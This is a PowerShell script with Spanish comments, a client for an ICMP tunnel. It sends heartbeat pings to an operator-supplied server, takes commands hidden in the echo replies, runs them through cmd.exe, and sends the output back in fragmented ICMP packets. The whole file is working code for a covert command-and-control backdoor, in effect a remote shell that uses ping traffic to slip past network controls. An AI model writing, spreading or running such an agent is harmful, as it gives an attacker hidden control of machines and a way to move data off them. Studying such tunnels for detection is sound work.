# =============================================
#   Cliente ICMP Tunnel - PowerShell
# =============================================
# Uso: .\cliente_icmp.ps1 -ServerIP 192.168.1.100 -ClientID mipc
# O con variables de entorno: $env:SERVER_IP y $env:CLIENT_ID

param(
    [string]$ServerIP = $env:SERVER_IP,
    [string]$ClientID = $env:CLIENT_ID,
    [int]$HeartbeatInterval = 5
)

if (-not $ServerIP -or -not $ClientID) {
    Write-Host "Uso: .\cliente_icmp.ps1 -ServerIP <ip> -ClientID <id>"
    exit 1
}

# ─────────────────────────────────────────────
#  Constantes de protocolo
# ─────────────────────────────────────────────
$CLIENT_MAGIC      = 0xCAFE
$SERVER_MAGIC      = 0xBEEF
$HEARTBEAT_PREFIX  = [System.Text.Encoding]::UTF8.GetBytes("HB:")
$MSG_OK            = [System.Text.Encoding]::UTF8.GetBytes("OK")
$MSG_CMD           = [System.Text.Encoding]::UTF8.GetBytes("CMD:")
$MSG_RESULT        = [System.Text.Encoding]::UTF8.GetBytes("RESULT:")
$RESULT_CHUNK_SIZE = 800
$SOCKET_TIMEOUT_MS = 6000
$SEQ               = 1

# ─────────────────────────────────────────────
#  Helpers de bytes
# ─────────────────────────────────────────────
function Concat-Bytes {
    param([byte[][]]$Arrays)
    $total = 0
    foreach ($a in $Arrays) { $total += $a.Length }
    $result = New-Object byte[] $total
    $offset = 0
    foreach ($a in $Arrays) {
        [System.Buffer]::BlockCopy($a, 0, $result, $offset, $a.Length)
        $offset += $a.Length
    }
    return $result
}

function Starts-With {
    param([byte[]]$Data, [byte[]]$Prefix)
    if ($Data.Length -lt $Prefix.Length) { return $false }
    for ($i = 0; $i -lt $Prefix.Length; $i++) {
        if ($Data[$i] -ne $Prefix[$i]) { return $false }
    }
    return $true
}

function Bytes-Equal {
    param([byte[]]$A, [byte[]]$B)
    if ($A.Length -ne $B.Length) { return $false }
    for ($i = 0; $i -lt $A.Length; $i++) {
        if ($A[$i] -ne $B[$i]) { return $false }
    }
    return $true
}

# ─────────────────────────────────────────────
#  Checksum ICMP
# ─────────────────────────────────────────────
function Get-Checksum {
    param([byte[]]$Data)
    $sum = 0
    $i = 0
    while ($i -lt $Data.Length - 1) {
        $sum += ($Data[$i + 1] -shl 8) + $Data[$i]
        $i += 2
    }
    if ($Data.Length % 2 -eq 1) { $sum += $Data[$Data.Length - 1] }
    $sum = ($sum -shr 16) + ($sum -band 0xFFFF)
    $sum += ($sum -shr 16)
    return (-bnot $sum) -band 0xFFFF
}

# ─────────────────────────────────────────────
#  Construir ICMP Echo Request
# ─────────────────────────────────────────────
function Build-Request {
    param([byte[]]$Payload)
    $seq = $script:SEQ
    $script:SEQ++

    # Header sin checksum
    $hdr = [byte[]]@(
        8, 0,                                           # type, code
        0, 0,                                           # checksum placeholder
        ($CLIENT_MAGIC -shr 8) -band 0xFF, $CLIENT_MAGIC -band 0xFF,   # id
        ($seq -shr 8) -band 0xFF, $seq -band 0xFF       # sequence
    )

    $raw = Concat-Bytes @($hdr, $Payload)
    $ck  = Get-Checksum $raw

    $hdr[2] = ($ck -shr 8) -band 0xFF
    $hdr[3] = $ck -band 0xFF

    return Concat-Bytes @($hdr, $Payload)
}

# ─────────────────────────────────────────────
#  Parsear ICMP Echo Reply
# ─────────────────────────────────────────────
function Parse-Reply {
    param([byte[]]$Packet)

    # Saltar cabecera IP (longitud variable)
    $ipHLen = ($Packet[0] -band 0x0F) * 4
    if ($Packet.Length -lt $ipHLen + 8) { return $null }

    $icmp = $Packet[$ipHLen..($Packet.Length - 1)]

    $type = $icmp[0]
    $pid  = ($icmp[4] -shl 8) + $icmp[5]

    if ($type -ne 0)              { return $null }   # solo Echo Reply
    if ($pid  -ne $SERVER_MAGIC)  { return $null }   # solo del servidor

    if ($icmp.Length -le 8) { return [byte[]]@() }
    return $icmp[8..($icmp.Length - 1)]
}

# ─────────────────────────────────────────────
#  Enviar payload y esperar reply
# ─────────────────────────────────────────────
function Send-And-Recv {
    param(
        [System.Net.Sockets.Socket]$Sock,
        [byte[]]$Payload,
        [int]$TimeoutMs = $SOCKET_TIMEOUT_MS
    )

    $pkt = Build-Request $Payload
    $ep  = [System.Net.IPEndPoint]::new([System.Net.IPAddress]::Parse($ServerIP), 0)
    $Sock.SendTo($pkt, $ep) | Out-Null

    $Sock.ReceiveTimeout = $TimeoutMs
    $buf    = New-Object byte[] 65535
    $remote = [System.Net.EndPoint]([System.Net.IPEndPoint]::new([System.Net.IPAddress]::Any, 0))

    $deadline = [System.Diagnostics.Stopwatch]::StartNew()
    while ($deadline.ElapsedMilliseconds -lt $TimeoutMs) {
        try {
            $n       = $Sock.ReceiveFrom($buf, [ref]$remote)
            $payload = Parse-Reply $buf[0..($n - 1)]
            if ($null -ne $payload) { return $payload }
        } catch [System.Net.Sockets.SocketException] {
            return $null   # timeout
        }
    }
    return $null
}

# ─────────────────────────────────────────────
#  Ejecutar comando local
# ─────────────────────────────────────────────
function Invoke-Command-Local {
    param([string]$Command)
    try {
        $result = & cmd.exe /c $Command 2>&1
        if ($result) { return ($result -join "`n") }
        return "(sin salida)"
    } catch {
        return "[ERROR] $_"
    }
}

# ─────────────────────────────────────────────
#  Enviar resultado fragmentado
# ─────────────────────────────────────────────
function Send-Result {
    param(
        [System.Net.Sockets.Socket]$Sock,
        [string]$Result
    )

    $data     = [System.Text.Encoding]::UTF8.GetBytes($Result)
    $idPrefix = [System.Text.Encoding]::UTF8.GetBytes("${ClientID}:")
    $chunks   = [System.Collections.Generic.List[byte[]]]::new()

    $i = 0
    while ($i -lt $data.Length) {
        $end    = [Math]::Min($i + $RESULT_CHUNK_SIZE, $data.Length)
        $chunks.Add($data[$i..($end - 1)])
        $i = $end
    }
    if ($chunks.Count -eq 0) {
        $chunks.Add([System.Text.Encoding]::UTF8.GetBytes("(sin salida)"))
    }

    $total = $chunks.Count
    for ($idx = 0; $idx -lt $total; $idx++) {
        $payload = Concat-Bytes @($MSG_RESULT, $idPrefix, $chunks[$idx])
        $ack     = Send-And-Recv $Sock $payload -TimeoutMs 8000
        if ($null -eq $ack) {
            # reintento único
            Send-And-Recv $Sock $payload -TimeoutMs 8000 | Out-Null
        }
        Write-Host "  [↑ fragmento $($idx+1)/$total]"
        Start-Sleep -Milliseconds 50
    }
}

# ─────────────────────────────────────────────
#  Main
# ─────────────────────────────────────────────
Write-Host "============================================="
Write-Host "  Cliente ICMP Tunnel (PowerShell)"
Write-Host "============================================="
Write-Host "Servidor  : $ServerIP"
Write-Host "Client ID : $ClientID"
Write-Host "Heartbeat : cada ${HeartbeatInterval} s"
Write-Host ""

# Crear socket RAW ICMP
try {
    $sock = [System.Net.Sockets.Socket]::new(
        [System.Net.Sockets.AddressFamily]::InterNetwork,
        [System.Net.Sockets.SocketType]::Raw,
        [System.Net.Sockets.ProtocolType]::Icmp
    )
} catch {
    Write-Host "[ERROR] No se pudo crear socket RAW: $_"
    Write-Host "Ejecuta PowerShell como Administrador."
    exit 1
}

$hbPayload = Concat-Bytes @($HEARTBEAT_PREFIX, [System.Text.Encoding]::UTF8.GetBytes($ClientID))
$lastHb    = [DateTime]::MinValue

try {
    while ($true) {
        $now = [DateTime]::UtcNow
        if (($now - $lastHb).TotalSeconds -lt $HeartbeatInterval) {
            Start-Sleep -Milliseconds 200
            continue
        }

        # Heartbeat
        $lastHb = [DateTime]::UtcNow
        Write-Host -NoNewline "."

        $reply = Send-And-Recv $sock $hbPayload

        if ($null -eq $reply) {
            Write-Host "`n[!] Sin respuesta del servidor"
            continue
        }

        if (Bytes-Equal $reply $MSG_OK) { continue }

        if (Starts-With $reply $MSG_CMD) {
            $cmdBytes = $reply[$MSG_CMD.Length..($reply.Length - 1)]
            $cmd      = [System.Text.Encoding]::UTF8.GetString($cmdBytes).Trim()

            Write-Host "`n[← CMD] $cmd"
            $output = Invoke-Command-Local $cmd
            Write-Host "[SALIDA]`n$output`n"

            Send-Result $sock $output
            Write-Host "[✓] Resultado enviado`n"

            $lastHb = [DateTime]::MinValue   # HB inmediato
        }
    }
} catch [System.Exception] {
    if ($_.Exception.Message -notmatch "interrupt") {
        Write-Host "`n[!] $_"
    }
} finally {
    $sock.Close()
    Write-Host "Cliente cerrado."
}